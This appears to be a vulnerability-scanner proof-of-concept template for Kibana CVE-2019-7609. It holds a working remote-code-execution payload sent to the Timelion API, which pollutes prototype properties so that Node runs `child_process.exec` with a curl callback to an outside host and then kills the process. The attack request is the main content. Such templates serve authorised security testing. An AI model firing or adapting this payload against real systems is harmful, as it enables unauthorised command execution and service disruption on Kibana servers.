id: poc-yaml-kibana-cve-2019-7609-rce

info:
  name: poc-yaml-kibana-cve-2019-7609-rce
  author: Monday
  severity: critical
  tags: xray-converted,rce,cve-2019-7609,ct-113651
  reference:
    - https://github.com/vulhub/vulhub/blob/e5c1b204a6bf1e27d654569ec963329486f230e6/kibana/CVE-2019-7609/README.zh-cn.md

http:
  - raw:
      - |
        GET /app/kibana HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
  - raw:
      - |
        POST /api/timelion/run HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json;charset=UTF-8
        kbn-version: {{version}}

        {"sheet":[".es(*).props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"curl {{reverseURL}}\");process.exit()//')\n.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')"],"time":{"from":"now-15m","to":"now","mode":"quick","interval":"auto","timezone":"Asia/Shanghai"}}
        

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
  - raw:
      - |
        POST /app/canvas HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200